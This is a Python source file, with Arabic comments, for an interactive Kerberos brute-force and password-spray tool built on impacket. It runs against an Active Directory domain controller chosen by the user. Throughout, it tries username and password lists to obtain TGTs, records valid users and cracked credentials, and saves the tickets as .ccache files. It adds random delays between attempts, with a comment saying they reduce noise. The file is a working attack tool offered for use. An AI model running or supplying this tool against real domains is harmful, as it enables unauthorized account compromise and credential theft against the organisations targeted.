#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# Kerberos Brute-Forcer - Interactive Edition
# نفس تصميم وأسلوب ACL Takeover Tool
#

import sys
import re
import socket
import signal
import time
import random
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# المكتبات الخارجية
try:
    from impacket import version
    from impacket.krb5.kerberosv5 import getKerberosTGT, KerberosError
    from impacket.krb5 import constants
    from impacket.krb5.types import Principal
    from impacket.krb5.ccache import CCache
    from colorama import Fore, Style, init
except ImportError as e:
    print(f"[!] Missing required library: {e}")
    print("[!] Please install: pip install impacket colorama")
    sys.exit(1)

init(autoreset=True)

# ============================================================
# Signal Handler & Helpers (نفس نمط الأداة السابقة)
# ============================================================
def _exit_handler(sig, frame):
    print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
    sys.exit(0)

signal.signal(signal.SIGINT, _exit_handler)

def banner():
    print(Fore.CYAN + """
    ╔═══════════════════════════════════════════════════════════╗
    ║            Kerberos Brute-Forcer / Password Spray         ║
    ║          Exploit weak passwords via Kerberos Pre-Auth      ║
    ╚═══════════════════════════════════════════════════════════╝
    """ + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Running on: {sys.platform}" + Style.RESET_ALL)

def validate_ip(ip):
    pattern = r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$'
    if not re.match(pattern, ip):
        return False
    return all(0 <= int(p) <= 255 for p in ip.split('.'))

def validate_domain(domain):
    pattern = r'^([a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}$'
    if not re.match(pattern, domain):
        return False
    return True

def get_input(prompt, validator=None, error_msg=None, allow_empty=False):
    while True:
        try:
            value = input(prompt).strip()
            if not value and not allow_empty:
                print(Fore.RED + "[!] This field cannot be empty!" + Style.RESET_ALL)
                continue
            if validator and value and not validator(value):
                print(Fore.RED + f"[!] {error_msg}" + Style.RESET_ALL)
                continue
            return value
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n\n[!] Exiting... Goodbye!" + Style.RESET_ALL)
            sys.exit(0)

def check_host_reachable(ip, port=88):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except Exception:
        return False

# ============================================================
# Kerberos Attacker Class (معدلة للعمل التفاعلي)
# ============================================================
class KerberosBruteForcer:
    def __init__(self, domain, kdc_ip):
        self.domain = domain.upper()
        self.kdc_ip = kdc_ip
        self.found = {}
        self.valid_users = set()
        self.lock = Lock()
        self.total_attempts = 0
        self.current_attempt = 0
        self.stop_on_first = False

    def _try_kerberos_tgt(self, username, password):
        """محاولة الحصول على TGT للمستخدم."""
        try:
            user_principal = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
            tgt, cipher, user_key, session_key = getKerberosTGT(
                user_principal, password, self.domain, '', '', kdcHost=self.kdc_ip
            )
            return (tgt, user_key)
        except KerberosError as e:
            return e
        except Exception as e:
            return e

    def _worker(self, username, password, save_tickets=False, output_file=None):
        """الدالة التي تعمل في كل خيط."""
        time.sleep(random.uniform(0.1, 0.3))  # تقليل الضوضاء
        result = self._try_kerberos_tgt(username, password)
        with self.lock:
            self.current_attempt += 1
            progress = f"[{self.current_attempt}/{self.total_attempts}]"
            sys.stdout.write(f"\r{Fore.CYAN}[*] Trying: {username}:{password} {progress}")
            sys.stdout.flush()

        if isinstance(result, tuple):
            tgt, user_key = result
            with self.lock:
                print(Fore.GREEN + f"\n[+] SUCCESS! {username}:{password}" + Style.RESET_ALL)
                self.found[username] = password
                if output_file:
                    with open(output_file, 'a') as f:
                        f.write(f"{username}:{password}\n")
                if save_tickets:
                    try:
                        ccache = CCache()
                        ccache.fromTGT(tgt, user_key, user_key)
                        ticket_file = f"{username}.ccache"
                        ccache.saveFile(ticket_file)
                        print(Fore.YELLOW + f"[*] Saved TGT to {ticket_file}" + Style.RESET_ALL)
                    except Exception as e:
                        print(Fore.RED + f"[!] Failed to save ticket: {e}" + Style.RESET_ALL)
            return True
        elif isinstance(result, KerberosError):
            err_code = result.getErrorCode()
            if err_code == constants.ErrorCodes.KDC_ERR_PREAUTH_FAILED.value:
                with self.lock:
                    self.valid_users.add(username)
                return False
            elif err_code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
                return False
            else:
                return False
        else:
            return False

    def run_brute_force(self, users, passwords, threads=5, save_tickets=False, output_file=None, stop_on_first=False):
        """وضع Brute-Force: كل كلمة مرور مع كل مستخدم."""
        self.total_attempts = len(users) * len(passwords)
        self.current_attempt = 0
        self.stop_on_first = stop_on_first
        print(Fore.CYAN + f"\n[*] Starting Brute-Force Attack" + Style.RESET_ALL)
        print(Fore.CYAN + f"[*] Users: {len(users)} | Passwords: {len(passwords)} | Total attempts: {self.total_attempts}" + Style.RESET_ALL)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for user in users:
                if stop_on_first and user in self.found:
                    continue
                for pwd in passwords:
                    futures.append(executor.submit(self._worker, user, pwd, save_tickets, output_file))

            for future in as_completed(futures):
                # يمكن إضافة منطق التوقف المبكر
                pass

        print("\n")  # سطر جديد بعد انتهاء شريط التقدم

    def run_password_spray(self, users, passwords, threads=5, save_tickets=False, output_file=None, stop_on_first=False):
        """وضع Password Spray: كلمة مرور واحدة عبر جميع المستخدمين."""
        self.total_attempts = len(passwords) * len(users)
        self.current_attempt = 0
        self.stop_on_first = stop_on_first
        print(Fore.CYAN + f"\n[*] Starting Password Spray Attack" + Style.RESET_ALL)
        print(Fore.CYAN + f"[*] Users: {len(users)} | Passwords: {len(passwords)} | Total attempts: {self.total_attempts}" + Style.RESET_ALL)

        with ThreadPoolExecutor(max_workers=threads) as executor:
            for pwd in passwords:
                print(Fore.YELLOW + f"[*] Spraying password: {pwd}" + Style.RESET_ALL)
                futures = []
                for user in users:
                    if stop_on_first and user in self.found:
                        continue
                    futures.append(executor.submit(self._worker, user, pwd, save_tickets, output_file))
                for future in as_completed(futures):
                    pass
                if self.found:
                    print(Fore.GREEN + f"[+] Found {len(self.found)} valid credential(s) so far." + Style.RESET_ALL)
        print()

    def print_summary(self):
        print(Fore.CYAN + "\n" + "="*50 + Style.RESET_ALL)
        print(Fore.GREEN + "[+] Summary:" + Style.RESET_ALL)
        print(f"    Valid users (preauth failed): {len(self.valid_users)}")
        print(f"    Cracked passwords: {len(self.found)}")
        if self.found:
            print(Fore.GREEN + "\n[+] Credentials found:" + Style.RESET_ALL)
            for u, p in self.found.items():
                print(f"    {u}:{p}")
        else:
            print(Fore.RED + "[-] No credentials found." + Style.RESET_ALL)
        print(Fore.CYAN + "="*50 + Style.RESET_ALL)

# ============================================================
# Main Interactive Menu
# ============================================================
def main():
    banner()

    # جمع معلومات الاتصال
    dc_ip = get_input(
        Fore.CYAN + "[?] Enter Domain Controller IP: " + Style.RESET_ALL,
        validate_ip, "Invalid IP address! Example: 192.168.1.1"
    )
    print(Fore.YELLOW + "[*] Checking DC reachability (port 88)..." + Style.RESET_ALL)
    if not check_host_reachable(dc_ip, 88):
        print(Fore.RED + f"[!] Cannot reach {dc_ip}:88 (Kerberos)" + Style.RESET_ALL)
        if not check_host_reachable(dc_ip, 445):
            print(Fore.RED + "[!] Host seems down. Exiting." + Style.RESET_ALL)
            sys.exit(1)
    print(Fore.GREEN + f"[+] DC {dc_ip} is reachable!" + Style.RESET_ALL)

    domain = get_input(
        Fore.CYAN + "[?] Enter Domain Name (e.g., cs.org): " + Style.RESET_ALL,
        validate_domain, "Invalid domain format!"
    )

    # قائمة المستخدمين
    print(Fore.CYAN + "\n[?] User specification:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Single username")
    print(Fore.WHITE + "    2. File containing usernames (one per line)")
    user_choice = get_input(Fore.CYAN + "[?] Choice (1/2): " + Style.RESET_ALL)
    if user_choice == '1':
        username = get_input(Fore.CYAN + "[?] Enter username: " + Style.RESET_ALL)
        users = [username]
    else:
        user_file = get_input(Fore.CYAN + "[?] Path to users file: " + Style.RESET_ALL)
        try:
            with open(user_file, 'r') as f:
                users = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"[+] Loaded {len(users)} usernames." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Failed to read file: {e}" + Style.RESET_ALL)
            sys.exit(1)

    # قائمة كلمات المرور
    print(Fore.CYAN + "\n[?] Password specification:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Single password")
    print(Fore.WHITE + "    2. File containing passwords (one per line)")
    pwd_choice = get_input(Fore.CYAN + "[?] Choice (1/2): " + Style.RESET_ALL)
    if pwd_choice == '1':
        password = get_input(Fore.CYAN + "[?] Enter password: " + Style.RESET_ALL)
        passwords = [password]
    else:
        pwd_file = get_input(Fore.CYAN + "[?] Path to passwords file: " + Style.RESET_ALL)
        try:
            with open(pwd_file, 'r') as f:
                passwords = [line.strip() for line in f if line.strip()]
            print(Fore.GREEN + f"[+] Loaded {len(passwords)} passwords." + Style.RESET_ALL)
        except Exception as e:
            print(Fore.RED + f"[!] Failed to read file: {e}" + Style.RESET_ALL)
            sys.exit(1)

    # وضع الهجوم
    print(Fore.CYAN + "\n[?] Attack mode:" + Style.RESET_ALL)
    print(Fore.WHITE + "    1. Brute-Force (try every password for every user)")
    print(Fore.WHITE + "    2. Password Spray (try one password across all users)")
    mode_choice = get_input(Fore.CYAN + "[?] Choice (1/2): " + Style.RESET_ALL)
    mode = 'brute' if mode_choice == '1' else 'spray'

    # خيارات إضافية
    threads = int(get_input(Fore.CYAN + "[?] Number of threads (default 5): " + Style.RESET_ALL, allow_empty=True) or 5)
    stop_on_first = get_input(Fore.CYAN + "[?] Stop after first success for each user? (y/n, default y): " + Style.RESET_ALL, allow_empty=True).lower() != 'n'
    save_tickets = get_input(Fore.CYAN + "[?] Save TGT tickets upon success? (y/n, default y): " + Style.RESET_ALL, allow_empty=True).lower() != 'n'
    output_file = get_input(Fore.CYAN + "[?] Output file for found credentials (leave empty for none): " + Style.RESET_ALL, allow_empty=True) or None

    # إنشاء كائن المهاجم
    attacker = KerberosBruteForcer(domain, dc_ip)

    # تنفيذ الهجوم
    try:
        if mode == 'brute':
            attacker.run_brute_force(users, passwords, threads, save_tickets, output_file, stop_on_first)
        else:
            attacker.run_password_spray(users, passwords, threads, save_tickets, output_file, stop_on_first)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Interrupted by user." + Style.RESET_ALL)
    finally:
        attacker.print_summary()

if __name__ == '__main__':
    main()
